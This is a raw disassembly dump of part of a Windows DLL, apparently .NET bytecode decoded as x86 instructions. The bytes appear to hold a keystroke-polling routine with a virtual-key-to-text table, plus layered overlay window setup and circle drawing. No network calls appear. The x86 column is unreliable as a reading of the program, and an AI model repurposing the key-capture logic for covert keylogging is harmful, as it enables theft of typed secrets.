100025c6:	fe 01                	incb   (%ecx)
100025c8:	16                   	push   %ss
100025c9:	fe 01                	incb   (%ecx)
100025cb:	0a 1f                	or     (%edi),%bl
100025cd:	14 28                	adc    $0x28,%al
100025cf:	21 00                	and    %eax,(%eax)
100025d1:	00 06                	add    %al,(%esi)
100025d3:	17                   	pop    %ss
100025d4:	5f                   	pop    %edi
100025d5:	16                   	push   %ss
100025d6:	fe 01                	incb   (%ecx)
100025d8:	16                   	push   %ss
100025d9:	fe 01                	incb   (%ecx)
100025db:	0b 02                	or     (%edx),%eax
100025dd:	1e                   	push   %ds
100025de:	33 06                	xor    (%esi),%eax
100025e0:	72 03                	jb     0x100025e5
100025e2:	00 00                	add    %al,(%eax)
100025e4:	70 2a                	jo     0x10002610
100025e6:	02 1f                	add    (%edi),%bl
100025e8:	09 33                	or     %esi,(%ebx)
100025ea:	06                   	push   %es
100025eb:	72 0d                	jb     0x100025fa
100025ed:	00 00                	add    %al,(%eax)
100025ef:	70 2a                	jo     0x1000261b
100025f1:	02 1f                	add    (%edi),%bl
100025f3:	0d 33 06 72 19       	or     $0x19720633,%eax
100025f8:	00 00                	add    %al,(%eax)
100025fa:	70 2a                	jo     0x10002626
100025fc:	02 1f                	add    (%edi),%bl
100025fe:	20 33                	and    %dh,(%ebx)
10002600:	06                   	push   %es
10002601:	72 1d                	jb     0x10002620
10002603:	00 00                	add    %al,(%eax)
10002605:	70 2a                	jo     0x10002631
10002607:	02 1f                	add    (%edi),%bl
10002609:	2e 33 06             	xor    %cs:(%esi),%eax
1000260c:	72 21                	jb     0x1000262f
1000260e:	00 00                	add    %al,(%eax)
10002610:	70 2a                	jo     0x1000263c
10002612:	02 1f                	add    (%edi),%bl
10002614:	41                   	inc    %ecx
10002615:	32 22                	xor    (%edx),%ah
10002617:	02 1f                	add    (%edi),%bl
10002619:	5a                   	pop    %edx
1000261a:	30 1d 02 d1 0c 06    	xor    %bl,0x60cd102
10002620:	07                   	pop    %es
10002621:	61                   	popa
10002622:	2d 0d 12 02 28       	sub    $0x2802120d,%eax
10002627:	1b 00                	sbb    (%eax),%eax
10002629:	00 0a                	add    %cl,(%edx)
1000262b:	6f                   	outsl  %ds:(%esi),(%dx)
1000262c:	1c 00                	sbb    $0x0,%al
1000262e:	00 0a                	add    %cl,(%edx)
10002630:	2a 12                	sub    (%edx),%dl
10002632:	02 28                	add    (%eax),%ch
10002634:	1b 00                	sbb    (%eax),%eax
10002636:	00 0a                	add    %cl,(%edx)
10002638:	2a 02                	sub    (%edx),%al
1000263a:	1f                   	pop    %ds
1000263b:	30 3f                	xor    %bh,(%edi)
1000263d:	82 00 00             	addb   $0x0,(%eax)
10002640:	00 02                	add    %al,(%edx)
10002642:	1f                   	pop    %ds
10002643:	39 30                	cmp    %esi,(%eax)
10002645:	7d 06                	jge    0x1000264d
10002647:	2c 6e                	sub    $0x6e,%al
10002649:	1f                   	pop    %ds
1000264a:	0a 8d 11 00 00 01    	or     0x1000011(%ebp),%cl
10002650:	13 04 11             	adc    (%ecx,%edx,1),%eax
10002653:	04 16                	add    $0x16,%al
10002655:	72 2d                	jb     0x10002684
10002657:	00 00                	add    %al,(%eax)
10002659:	70 a2                	jo     0x100025fd
1000265b:	11 04 17             	adc    %eax,(%edi,%edx,1)
1000265e:	72 31                	jb     0x10002691
10002660:	00 00                	add    %al,(%eax)
10002662:	70 a2                	jo     0x10002606
10002664:	11 04 18             	adc    %eax,(%eax,%ebx,1)
10002667:	72 35                	jb     0x1000269e
10002669:	00 00                	add    %al,(%eax)
1000266b:	70 a2                	jo     0x1000260f
1000266d:	11 04 19             	adc    %eax,(%ecx,%ebx,1)
10002670:	72 39                	jb     0x100026ab
10002672:	00 00                	add    %al,(%eax)
10002674:	70 a2                	jo     0x10002618
10002676:	11 04 1a             	adc    %eax,(%edx,%ebx,1)
10002679:	72 3d                	jb     0x100026b8
1000267b:	00 00                	add    %al,(%eax)
1000267d:	70 a2                	jo     0x10002621
1000267f:	11 04 1b             	adc    %eax,(%ebx,%ebx,1)
10002682:	72 41                	jb     0x100026c5
10002684:	00 00                	add    %al,(%eax)
10002686:	70 a2                	jo     0x1000262a
10002688:	11 04 1c             	adc    %eax,(%esp,%ebx,1)
1000268b:	72 45                	jb     0x100026d2
1000268d:	00 00                	add    %al,(%eax)
1000268f:	70 a2                	jo     0x10002633
10002691:	11 04 1d 72 49 00 00 	adc    %eax,0x4972(,%ebx,1)
10002698:	70 a2                	jo     0x1000263c
1000269a:	11 04 1e             	adc    %eax,(%esi,%ebx,1)
1000269d:	72 4d                	jb     0x100026ec
1000269f:	00 00                	add    %al,(%eax)
100026a1:	70 a2                	jo     0x10002645
100026a3:	11 04 1f             	adc    %eax,(%edi,%ebx,1)
100026a6:	09 72 51             	or     %esi,0x51(%edx)
100026a9:	00 00                	add    %al,(%eax)
100026ab:	70 a2                	jo     0x1000264f
100026ad:	11 04 0d 09 02 1f 30 	adc    %eax,0x301f0209(,%ecx,1)
100026b4:	59                   	pop    %ecx
100026b5:	9a 2a 02 d1 13 05 12 	lcall  $0x1205,$0x13d1022a
100026bc:	05 28 1b 00 00       	add    $0x1b28,%eax
100026c1:	0a 2a                	or     (%edx),%ch
100026c3:	02 1f                	add    (%edi),%bl
100026c5:	60                   	pusha
100026c6:	32 14 02             	xor    (%edx,%eax,1),%dl
100026c9:	1f                   	pop    %ds
100026ca:	69 30 0f 02 1f 30    	imul   $0x301f020f,(%eax),%esi
100026d0:	59                   	pop    %ecx
100026d1:	d1 13                	rcll   $1,(%ebx)
100026d3:	06                   	push   %es
100026d4:	12 06                	adc    (%esi),%al
100026d6:	28 1b                	sub    %bl,(%ebx)
100026d8:	00 00                	add    %al,(%eax)
100026da:	0a 2a                	or     (%edx),%ch
100026dc:	02 1f                	add    (%edi),%bl
100026de:	6a 33                	push   $0x33
100026e0:	06                   	push   %es
100026e1:	72 4d                	jb     0x10002730
100026e3:	00 00                	add    %al,(%eax)
100026e5:	70 2a                	jo     0x10002711
100026e7:	02 1f                	add    (%edi),%bl
100026e9:	6b 33 06             	imul   $0x6,(%ebx),%esi
100026ec:	72 55                	jb     0x10002743
100026ee:	00 00                	add    %al,(%eax)
100026f0:	70 2a                	jo     0x1000271c
100026f2:	02 1f                	add    (%edi),%bl
100026f4:	6d                   	insl   (%dx),%es:(%edi)
100026f5:	33 06                	xor    (%esi),%eax
100026f7:	72 59                	jb     0x10002752
100026f9:	00 00                	add    %al,(%eax)
100026fb:	70 2a                	jo     0x10002727
100026fd:	02 1f                	add    (%edi),%bl
100026ff:	6e                   	outsb  %ds:(%esi),(%dx)
10002700:	33 06                	xor    (%esi),%eax
10002702:	72 5d                	jb     0x10002761
10002704:	00 00                	add    %al,(%eax)
10002706:	70 2a                	jo     0x10002732
10002708:	02 1f                	add    (%edi),%bl
1000270a:	6f                   	outsl  %ds:(%esi),(%dx)
1000270b:	33 06                	xor    (%esi),%eax
1000270d:	72 61                	jb     0x10002770
1000270f:	00 00                	add    %al,(%eax)
10002711:	70 2a                	jo     0x1000273d
10002713:	02 20                	add    (%eax),%ah
10002715:	ba 00 00 00 33       	mov    $0x33000000,%edx
1000271a:	0f 06                	clts
1000271c:	2d 06 72 65 00       	sub    $0x657206,%eax
10002721:	00 70 2a             	add    %dh,0x2a(%eax)
10002724:	72 69                	jb     0x1000278f
10002726:	00 00                	add    %al,(%eax)
10002728:	70 2a                	jo     0x10002754
1000272a:	02 20                	add    (%eax),%ah
1000272c:	bb 00 00 00 33       	mov    $0x33000000,%ebx
10002731:	0f 06                	clts
10002733:	2d 06 72 6d 00       	sub    $0x6d7206,%eax
10002738:	00 70 2a             	add    %dh,0x2a(%eax)
1000273b:	72 55                	jb     0x10002792
1000273d:	00 00                	add    %al,(%eax)
1000273f:	70 2a                	jo     0x1000276b
10002741:	02 20                	add    (%eax),%ah
10002743:	bc 00 00 00 33       	mov    $0x33000000,%esp
10002748:	0f 06                	clts
1000274a:	2d 06 72 71 00       	sub    $0x717206,%eax
1000274f:	00 70 2a             	add    %dh,0x2a(%eax)
10002752:	72 75                	jb     0x100027c9
10002754:	00 00                	add    %al,(%eax)
10002756:	70 2a                	jo     0x10002782
10002758:	02 20                	add    (%eax),%ah
1000275a:	bd 00 00 00 33       	mov    $0x33000000,%ebp
1000275f:	0f 06                	clts
10002761:	2d 06 72 59 00       	sub    $0x597206,%eax
10002766:	00 70 2a             	add    %dh,0x2a(%eax)
10002769:	72 79                	jb     0x100027e4
1000276b:	00 00                	add    %al,(%eax)
1000276d:	70 2a                	jo     0x10002799
1000276f:	02 20                	add    (%eax),%ah
10002771:	be 00 00 00 33       	mov    $0x33000000,%esi
10002776:	0f 06                	clts
10002778:	2d 06 72 5d 00       	sub    $0x5d7206,%eax
1000277d:	00 70 2a             	add    %dh,0x2a(%eax)
10002780:	72 7d                	jb     0x100027ff
10002782:	00 00                	add    %al,(%eax)
10002784:	70 2a                	jo     0x100027b0
10002786:	02 20                	add    (%eax),%ah
10002788:	bf 00 00 00 33       	mov    $0x33000000,%edi
1000278d:	0f 06                	clts
1000278f:	2d 06 72 61 00       	sub    $0x617206,%eax
10002794:	00 70 2a             	add    %dh,0x2a(%eax)
10002797:	72 81                	jb     0x1000271a
10002799:	00 00                	add    %al,(%eax)
1000279b:	70 2a                	jo     0x100027c7
1000279d:	02 20                	add    (%eax),%ah
1000279f:	c0 00 00             	rolb   $0x0,(%eax)
100027a2:	00 33                	add    %dh,(%ebx)
100027a4:	0f 06                	clts
100027a6:	2d 06 72 01 00       	sub    $0x17206,%eax
100027ab:	00 70 2a             	add    %dh,0x2a(%eax)
100027ae:	72 85                	jb     0x10002735
100027b0:	00 00                	add    %al,(%eax)
100027b2:	70 2a                	jo     0x100027de
100027b4:	02 20                	add    (%eax),%ah
100027b6:	db 00                	fildl  (%eax)
100027b8:	00 00                	add    %al,(%eax)
100027ba:	33 0f                	xor    (%edi),%ecx
100027bc:	06                   	push   %es
100027bd:	2d 06 72 89 00       	sub    $0x897206,%eax
100027c2:	00 70 2a             	add    %dh,0x2a(%eax)
100027c5:	72 8d                	jb     0x10002754
100027c7:	00 00                	add    %al,(%eax)
100027c9:	70 2a                	jo     0x100027f5
100027cb:	02 20                	add    (%eax),%ah
100027cd:	dd 00                	fldl   (%eax)
100027cf:	00 00                	add    %al,(%eax)
100027d1:	33 0f                	xor    (%edi),%ecx
100027d3:	06                   	push   %es
100027d4:	2d 06 72 91 00       	sub    $0x917206,%eax
100027d9:	00 70 2a             	add    %dh,0x2a(%eax)
100027dc:	72 95                	jb     0x10002773
100027de:	00 00                	add    %al,(%eax)
100027e0:	70 2a                	jo     0x1000280c
100027e2:	02 20                	add    (%eax),%ah
100027e4:	dc 00                	faddl  (%eax)
100027e6:	00 00                	add    %al,(%eax)
100027e8:	33 0f                	xor    (%edi),%ecx
100027ea:	06                   	push   %es
100027eb:	2d 06 72 99 00       	sub    $0x997206,%eax
100027f0:	00 70 2a             	add    %dh,0x2a(%eax)
100027f3:	72 9d                	jb     0x10002792
100027f5:	00 00                	add    %al,(%eax)
100027f7:	70 2a                	jo     0x10002823
100027f9:	02 20                	add    (%eax),%ah
100027fb:	de 00                	fiadds (%eax)
100027fd:	00 00                	add    %al,(%eax)
100027ff:	33 0f                	xor    (%edi),%ecx
10002801:	06                   	push   %es
10002802:	2d 06 72 a1 00       	sub    $0xa17206,%eax
10002807:	00 70 2a             	add    %dh,0x2a(%eax)
1000280a:	72 a5                	jb     0x100027b1
1000280c:	00 00                	add    %al,(%eax)
1000280e:	70 2a                	jo     0x1000283a
10002810:	72 01                	jb     0x10002813
10002812:	00 00                	add    %al,(%eax)
10002814:	70 2a                	jo     0x10002840
10002816:	00 00                	add    %al,(%eax)
10002818:	1b 30                	sbb    (%eax),%esi
1000281a:	02 00                	add    (%eax),%al
1000281c:	4a                   	dec    %edx
1000281d:	00 00                	add    %al,(%eax)
1000281f:	00 08                	add    %cl,(%eax)
10002821:	00 00                	add    %al,(%eax)
10002823:	11 16                	adc    %edx,(%esi)
10002825:	0b 7e 06             	or     0x6(%esi),%edi
10002828:	00 00                	add    %al,(%eax)
1000282a:	04 25                	add    $0x25,%al
1000282c:	0d 12 01 28 15       	or     $0x15280112,%eax
10002831:	00 00                	add    %al,(%eax)
10002833:	0a 7e 05             	or     0x5(%esi),%bh
10002836:	00 00                	add    %al,(%eax)
10002838:	04 6f                	add    $0x6f,%al
1000283a:	17                   	pop    %ss
1000283b:	00 00                	add    %al,(%eax)
1000283d:	0a 2d 09 16 8d 11    	or     0x118d1609,%ch
10002843:	00 00                	add    %al,(%eax)
10002845:	01 0c de             	add    %ecx,(%esi,%ebx,8)
10002848:	23 7e 05             	and    0x5(%esi),%edi
1000284b:	00 00                	add    %al,(%eax)
1000284d:	04 6f                	add    $0x6f,%al
1000284f:	1d 00 00 0a 0a       	sbb    $0xa0a0000,%eax
10002854:	7e 05                	jle    0x1000285b
10002856:	00 00                	add    %al,(%eax)
10002858:	04 6f                	add    $0x6f,%al
1000285a:	1e                   	push   %ds
1000285b:	00 00                	add    %al,(%eax)
1000285d:	0a 06                	or     (%esi),%al
1000285f:	0c de                	or     $0xde,%al
10002861:	0a 07                	or     (%edi),%al
10002863:	2c 06                	sub    $0x6,%al
10002865:	09 28                	or     %ebp,(%eax)
10002867:	19 00                	sbb    %eax,(%eax)
10002869:	00 0a                	add    %cl,(%edx)
1000286b:	dc 08                	fmull  (%eax)
1000286d:	2a 00                	sub    (%eax),%al
1000286f:	00 01                	add    %al,(%ecx)
10002871:	10 00                	adc    %al,(%eax)
10002873:	00 02                	add    %al,(%edx)
10002875:	00 02                	add    %al,(%edx)
10002877:	00 3c 3e             	add    %bh,(%esi,%edi,1)
1000287a:	00 0a                	add    %cl,(%edx)
1000287c:	00 00                	add    %al,(%eax)
1000287e:	00 00                	add    %al,(%eax)
10002880:	13 30                	adc    (%eax),%esi
10002882:	03 00                	add    (%eax),%eax
10002884:	2d 00 00 00 09       	sub    $0x9000000,%eax
10002889:	00 00                	add    %al,(%eax)
1000288b:	11 02                	adc    %eax,(%edx)
1000288d:	28 20                	sub    %ah,(%eax)
1000288f:	00 00                	add    %al,(%eax)
10002891:	06                   	push   %es
10002892:	20 00                	and    %al,(%eax)
10002894:	80 00 00             	addb   $0x0,(%eax)
10002897:	5f                   	pop    %edi
10002898:	16                   	push   %ss
10002899:	fe 01                	incb   (%ecx)
1000289b:	16                   	push   %ss
1000289c:	fe 01                	incb   (%ecx)
1000289e:	0a 7e 04             	or     0x4(%esi),%bh
100028a1:	00 00                	add    %al,(%eax)
100028a3:	04 02                	add    $0x2,%al
100028a5:	90                   	nop
100028a6:	0b 7e 04             	or     0x4(%esi),%edi
100028a9:	00 00                	add    %al,(%eax)
100028ab:	04 02                	add    $0x2,%al
100028ad:	06                   	push   %es
100028ae:	9c                   	pushf
100028af:	06                   	push   %es
100028b0:	2c 05                	sub    $0x5,%al
100028b2:	07                   	pop    %es
100028b3:	16                   	push   %ss
100028b4:	fe 01                	incb   (%ecx)
100028b6:	2a 16                	sub    (%esi),%dl
100028b8:	2a 00                	sub    (%eax),%al
100028ba:	00 00                	add    %al,(%eax)
100028bc:	00 00                	add    %al,(%eax)
100028be:	00 00                	add    %al,(%eax)
100028c0:	08 00                	or     %al,(%eax)
100028c2:	00 00                	add    %al,(%eax)
100028c4:	09 00                	or     %eax,(%eax)
100028c6:	00 00                	add    %al,(%eax)
100028c8:	0d 00 00 00 20       	or     $0x20000000,%eax
100028cd:	00 00                	add    %al,(%eax)
100028cf:	00 2e                	add    %ch,(%esi)
100028d1:	00 00                	add    %al,(%eax)
100028d3:	00 30                	add    %dh,(%eax)
100028d5:	00 00                	add    %al,(%eax)
100028d7:	00 31                	add    %dh,(%ecx)
100028d9:	00 00                	add    %al,(%eax)
100028db:	00 32                	add    %dh,(%edx)
100028dd:	00 00                	add    %al,(%eax)
100028df:	00 33                	add    %dh,(%ebx)
100028e1:	00 00                	add    %al,(%eax)
100028e3:	00 34 00             	add    %dh,(%eax,%eax,1)
100028e6:	00 00                	add    %al,(%eax)
100028e8:	35 00 00 00 36       	xor    $0x36000000,%eax
100028ed:	00 00                	add    %al,(%eax)
100028ef:	00 37                	add    %dh,(%edi)
100028f1:	00 00                	add    %al,(%eax)
100028f3:	00 38                	add    %bh,(%eax)
100028f5:	00 00                	add    %al,(%eax)
100028f7:	00 39                	add    %bh,(%ecx)
100028f9:	00 00                	add    %al,(%eax)
100028fb:	00 41 00             	add    %al,0x0(%ecx)
100028fe:	00 00                	add    %al,(%eax)
10002900:	42                   	inc    %edx
10002901:	00 00                	add    %al,(%eax)
10002903:	00 43 00             	add    %al,0x0(%ebx)
10002906:	00 00                	add    %al,(%eax)
10002908:	44                   	inc    %esp
10002909:	00 00                	add    %al,(%eax)
1000290b:	00 45 00             	add    %al,0x0(%ebp)
1000290e:	00 00                	add    %al,(%eax)
10002910:	46                   	inc    %esi
10002911:	00 00                	add    %al,(%eax)
10002913:	00 47 00             	add    %al,0x0(%edi)
10002916:	00 00                	add    %al,(%eax)
10002918:	48                   	dec    %eax
10002919:	00 00                	add    %al,(%eax)
1000291b:	00 49 00             	add    %cl,0x0(%ecx)
1000291e:	00 00                	add    %al,(%eax)
10002920:	4a                   	dec    %edx
10002921:	00 00                	add    %al,(%eax)
10002923:	00 4b 00             	add    %cl,0x0(%ebx)
10002926:	00 00                	add    %al,(%eax)
10002928:	4c                   	dec    %esp
10002929:	00 00                	add    %al,(%eax)
1000292b:	00 4d 00             	add    %cl,0x0(%ebp)
1000292e:	00 00                	add    %al,(%eax)
10002930:	4e                   	dec    %esi
10002931:	00 00                	add    %al,(%eax)
10002933:	00 4f 00             	add    %cl,0x0(%edi)
10002936:	00 00                	add    %al,(%eax)
10002938:	50                   	push   %eax
10002939:	00 00                	add    %al,(%eax)
1000293b:	00 51 00             	add    %dl,0x0(%ecx)
1000293e:	00 00                	add    %al,(%eax)
10002940:	52                   	push   %edx
10002941:	00 00                	add    %al,(%eax)
10002943:	00 53 00             	add    %dl,0x0(%ebx)
10002946:	00 00                	add    %al,(%eax)
10002948:	54                   	push   %esp
10002949:	00 00                	add    %al,(%eax)
1000294b:	00 55 00             	add    %dl,0x0(%ebp)
1000294e:	00 00                	add    %al,(%eax)
10002950:	56                   	push   %esi
10002951:	00 00                	add    %al,(%eax)
10002953:	00 57 00             	add    %dl,0x0(%edi)
10002956:	00 00                	add    %al,(%eax)
10002958:	58                   	pop    %eax
10002959:	00 00                	add    %al,(%eax)
1000295b:	00 59 00             	add    %bl,0x0(%ecx)
1000295e:	00 00                	add    %al,(%eax)
10002960:	5a                   	pop    %edx
10002961:	00 00                	add    %al,(%eax)
10002963:	00 60 00             	add    %ah,0x0(%eax)
10002966:	00 00                	add    %al,(%eax)
10002968:	61                   	popa
10002969:	00 00                	add    %al,(%eax)
1000296b:	00 62 00             	add    %ah,0x0(%edx)
1000296e:	00 00                	add    %al,(%eax)
10002970:	63 00                	arpl   %eax,(%eax)
10002972:	00 00                	add    %al,(%eax)
10002974:	64 00 00             	add    %al,%fs:(%eax)
10002977:	00 65 00             	add    %ah,0x0(%ebp)
1000297a:	00 00                	add    %al,(%eax)
1000297c:	66 00 00             	data16 add %al,(%eax)
1000297f:	00 67 00             	add    %ah,0x0(%edi)
10002982:	00 00                	add    %al,(%eax)
10002984:	68 00 00 00 69       	push   $0x69000000
10002989:	00 00                	add    %al,(%eax)
1000298b:	00 6a 00             	add    %ch,0x0(%edx)
1000298e:	00 00                	add    %al,(%eax)
10002990:	6b 00 00             	imul   $0x0,(%eax),%eax
10002993:	00 6d 00             	add    %ch,0x0(%ebp)
10002996:	00 00                	add    %al,(%eax)
10002998:	6e                   	outsb  %ds:(%esi),(%dx)
10002999:	00 00                	add    %al,(%eax)
1000299b:	00 6f 00             	add    %ch,0x0(%edi)
1000299e:	00 00                	add    %al,(%eax)
100029a0:	ba 00 00 00 bb       	mov    $0xbb000000,%edx
100029a5:	00 00                	add    %al,(%eax)
100029a7:	00 bc 00 00 00 bd 00 	add    %bh,0xbd0000(%eax,%eax,1)
100029ae:	00 00                	add    %al,(%eax)
100029b0:	be 00 00 00 bf       	mov    $0xbf000000,%esi
100029b5:	00 00                	add    %al,(%eax)
100029b7:	00 c0                	add    %al,%al
100029b9:	00 00                	add    %al,(%eax)
100029bb:	00 db                	add    %bl,%bl
100029bd:	00 00                	add    %al,(%eax)
100029bf:	00 dc                	add    %bl,%ah
100029c1:	00 00                	add    %al,(%eax)
100029c3:	00 dd                	add    %bl,%ch
100029c5:	00 00                	add    %al,(%eax)
100029c7:	00 de                	add    %bl,%dh
100029c9:	00 00                	add    %al,(%eax)
100029cb:	00 03                	add    %al,(%ebx)
100029cd:	30 03                	xor    %al,(%ebx)
100029cf:	00 49 00             	add    %cl,0x0(%ecx)
100029d2:	00 00                	add    %al,(%eax)
100029d4:	00 00                	add    %al,(%eax)
100029d6:	00 00                	add    %al,(%eax)
100029d8:	20 00                	and    %al,(%eax)
100029da:	01 00                	add    %eax,(%eax)
100029dc:	00 8d 14 00 00 01    	add    %cl,0x1000014(%ebp)
100029e2:	80 04 00 00          	addb   $0x0,(%eax,%eax,1)
100029e6:	04 73                	add    $0x73,%al
100029e8:	1f                   	pop    %ds
100029e9:	00 00                	add    %al,(%eax)
100029eb:	0a 80 05 00 00 04    	or     0x4000005(%eax),%al
100029f1:	73 05                	jae    0x100029f8
100029f3:	00 00                	add    %al,(%eax)
100029f5:	0a 80 06 00 00 04    	or     0x4000006(%eax),%al
100029fb:	14 80                	adc    $0x80,%al
100029fd:	07                   	pop    %es
100029fe:	00 00                	add    %al,(%eax)
10002a00:	04 16                	add    $0x16,%al
10002a02:	fe                   	(bad)
10002a03:	13 80 08 00 00 04    	adc    0x4000008(%eax),%eax
10002a09:	1f                   	pop    %ds
10002a0a:	43                   	inc    %ebx
10002a0b:	8d 15 00 00 01 25    	lea    0x25010000,%edx
10002a11:	d0 17                	rclb   $1,(%edi)
10002a13:	00 00                	add    %al,(%eax)
10002a15:	04 28                	add    $0x28,%al
10002a17:	21 00                	and    %eax,(%eax)
10002a19:	00 0a                	add    %cl,(%edx)
10002a1b:	80 09 00             	orb    $0x0,(%ecx)
10002a1e:	00 04 2a             	add    %al,(%edx,%ebp,1)
10002a21:	1e                   	push   %ds
10002a22:	02 28                	add    (%eax),%ch
10002a24:	05 00 00 0a 2a       	add    $0x2a0a0000,%eax
10002a29:	22 fe                	and    %dh,%bh
10002a2b:	13 7e 10             	adc    0x10(%esi),%edi
10002a2e:	00 00                	add    %al,(%eax)
10002a30:	04 2a                	add    $0x2a,%al
10002a32:	00 00                	add    %al,(%eax)
10002a34:	13 30                	adc    (%eax),%esi
10002a36:	04 00                	add    $0x0,%al
10002a38:	20 00                	and    %al,(%eax)
10002a3a:	00 00                	add    %al,(%eax)
10002a3c:	04 00                	add    $0x0,%al
10002a3e:	00 11                	add    %dl,(%ecx)
10002a40:	02 1f                	add    (%edi),%bl
10002a42:	ec                   	in     (%dx),%al
10002a43:	28 2d 00 00 06 0a    	sub    %ch,0xa060000
10002a49:	02 1f                	add    (%edi),%bl
10002a4b:	ec                   	in     (%dx),%al
10002a4c:	06                   	push   %es
10002a4d:	20 00                	and    %al,(%eax)
10002a4f:	00 00                	add    %al,(%eax)
10002a51:	08 60 20             	or     %ah,0x20(%eax)
10002a54:	80 00 00             	addb   $0x0,(%eax)
10002a57:	00 60 28             	add    %ah,0x28(%eax)
10002a5a:	2c 00                	sub    $0x0,%al
10002a5c:	00 06                	add    %al,(%esi)
10002a5e:	26 2a 66 02          	sub    %es:0x2(%esi),%ah
10002a62:	28 36                	sub    %dh,(%esi)
10002a64:	00 00                	add    %al,(%eax)
10002a66:	06                   	push   %es
10002a67:	02 7e 0d             	add    0xd(%esi),%bh
10002a6a:	00 00                	add    %al,(%eax)
10002a6c:	04 16                	add    $0x16,%al
10002a6e:	16                   	push   %ss
10002a6f:	16                   	push   %ss
10002a70:	16                   	push   %ss
10002a71:	1f                   	pop    %ds
10002a72:	13 28                	adc    (%eax),%ebp
10002a74:	2e 00 00             	add    %al,%cs:(%eax)
10002a77:	06                   	push   %es
10002a78:	26 2a 1e             	sub    %es:(%esi),%bl
10002a7b:	02 28                	add    (%eax),%ch
10002a7d:	05 00 00 0a 2a       	add    $0x2a0a0000,%eax
10002a82:	1e                   	push   %ds
10002a83:	02 28                	add    (%eax),%ch
10002a85:	05 00 00 0a 2a       	add    $0x2a0a0000,%eax
10002a8a:	00 00                	add    %al,(%eax)
10002a8c:	1b 30                	sbb    (%eax),%esi
10002a8e:	06                   	push   %es
10002a8f:	00 e9                	add    %ch,%cl
10002a91:	00 00                	add    %al,(%eax)
10002a93:	00 0a                	add    %cl,(%edx)
10002a95:	00 00                	add    %al,(%eax)
10002a97:	11 04 6f             	adc    %eax,(%edi,%ebp,2)
10002a9a:	22 00                	and    (%eax),%al
10002a9c:	00 0a                	add    %cl,(%edx)
10002a9e:	1a 6f 23             	sbb    0x23(%edi),%ch
10002aa1:	00 00                	add    %al,(%eax)
10002aa3:	0a 02                	or     (%edx),%al
10002aa5:	7b 18                	jnp    0x10002abf
10002aa7:	00 00                	add    %al,(%eax)
10002aa9:	04 6f                	add    $0x6f,%al
10002aab:	24 00                	and    $0x0,%al
10002aad:	00 0a                	add    %cl,(%edx)
10002aaf:	18 5b 0a             	sbb    %bl,0xa(%ebx)
10002ab2:	02 7b 18             	add    0x18(%ebx),%bh
10002ab5:	00 00                	add    %al,(%eax)
10002ab7:	04 6f                	add    $0x6f,%al
10002ab9:	25 00 00 0a 18       	and    $0x180a0000,%eax
10002abe:	5b                   	pop    %ebx
10002abf:	0b 1f                	or     (%edi),%ebx
10002ac1:	23 0c 1e             	and    (%esi,%ebx,1),%ecx
10002ac4:	0d 16 13 04 38       	or     $0x38041316,%eax
10002ac9:	ab                   	stos   %eax,%es:(%edi)
10002aca:	00 00                	add    %al,(%eax)
10002acc:	00 02                	add    %al,(%edx)
10002ace:	7b 1d                	jnp    0x10002aed
10002ad0:	00 00                	add    %al,(%eax)
10002ad2:	04 11                	add    $0x11,%al
10002ad4:	04 6c                	add    $0x6c,%al
10002ad6:	23 18                	and    (%eax),%ebx
10002ad8:	2d 44 54 fb 21       	sub    $0x21fb5444,%eax
10002add:	09 40 5a             	or     %eax,0x5a(%eax)
10002ae0:	23 00                	and    (%eax),%eax
10002ae2:	00 00                	add    %al,(%eax)
10002ae4:	00 00                	add    %al,(%eax)
10002ae6:	00 00                	add    %al,(%eax)
10002ae8:	40                   	inc    %eax
10002ae9:	5a                   	pop    %edx
10002aea:	23 00                	and    (%eax),%eax
10002aec:	00 00                	add    %al,(%eax)
10002aee:	00 00                	add    %al,(%eax)
10002af0:	00 14 40             	add    %dl,(%eax,%eax,2)
10002af3:	5b                   	pop    %ebx
10002af4:	58                   	pop    %eax
10002af5:	13 05 06 08 6c 11    	adc    0x116c0806,%eax
10002afb:	05 28 26 00 00       	add    $0x2628,%eax
10002b00:	0a 5a 69             	or     0x69(%edx),%bl
10002b03:	58                   	pop    %eax
10002b04:	09 18                	or     %ebx,(%eax)
10002b06:	5b                   	pop    %ebx
10002b07:	59                   	pop    %ecx
10002b08:	13 06                	adc    (%esi),%eax
10002b0a:	07                   	pop    %es
10002b0b:	08 6c 11 05          	or     %ch,0x5(%ecx,%edx,1)
10002b0f:	28 27                	sub    %ah,(%edi)
10002b11:	00 00                	add    %al,(%eax)
10002b13:	0a 5a 69             	or     0x69(%edx),%bl
10002b16:	58                   	pop    %eax
10002b17:	09 18                	or     %ebx,(%eax)
10002b19:	5b                   	pop    %ebx
10002b1a:	59                   	pop    %ecx
10002b1b:	13 07                	adc    (%edi),%eax
10002b1d:	20 ff                	and    %bh,%bh
10002b1f:	00 00                	add    %al,(%eax)
10002b21:	00 11                	add    %dl,(%ecx)
10002b23:	04 1f                	add    $0x1f,%al
10002b25:	2d 5a 59 13 08       	sub    $0x813595a,%eax
10002b2a:	11 08                	adc    %ecx,(%eax)
10002b2c:	1f                   	pop    %ds
10002b2d:	32 2f                	xor    (%edi),%ch
10002b2f:	04 1f                	add    $0x1f,%al
10002b31:	32 13                	xor    (%ebx),%dl
10002b33:	08 11                	or     %dl,(%ecx)
10002b35:	08 20                	or     %ah,(%eax)
10002b37:	ff 00                	incl   (%eax)
10002b39:	00 00                	add    %al,(%eax)
10002b3b:	20 ff                	and    %bh,%bh
10002b3d:	00 00                	add    %al,(%eax)
10002b3f:	00 20                	add    %ah,(%eax)
10002b41:	ff 00                	incl   (%eax)
10002b43:	00 00                	add    %al,(%eax)
10002b45:	28 28                	sub    %ch,(%eax)
10002b47:	00 00                	add    %al,(%eax)
10002b49:	0a 73 29             	or     0x29(%ebx),%dh
10002b4c:	00 00                	add    %al,(%eax)
10002b4e:	0a 13                	or     (%ebx),%dl
10002b50:	09 04 6f             	or     %eax,(%edi,%ebp,2)
10002b53:	22 00                	and    (%eax),%al
10002b55:	00 0a                	add    %cl,(%edx)
10002b57:	11 09                	adc    %ecx,(%ecx)
10002b59:	11 06                	adc    %eax,(%esi)
10002b5b:	11 07                	adc    %eax,(%edi)
10002b5d:	09 09                	or     %ecx,(%ecx)
10002b5f:	6f                   	outsl  %ds:(%esi),(%dx)
10002b60:	2a 00                	sub    (%eax),%al
10002b62:	00 0a                	add    %cl,(%edx)
10002b64:	de 0c 11             	fimuls (%ecx,%edx,1)
10002b67:	09 2c 07             	or     %ebp,(%edi,%eax,1)
10002b6a:	11 09                	adc    %ecx,(%ecx)
10002b6c:	6f                   	outsl  %ds:(%esi),(%dx)
10002b6d:	2b 00                	sub    (%eax),%eax
10002b6f:	00 0a                	add    %cl,(%edx)
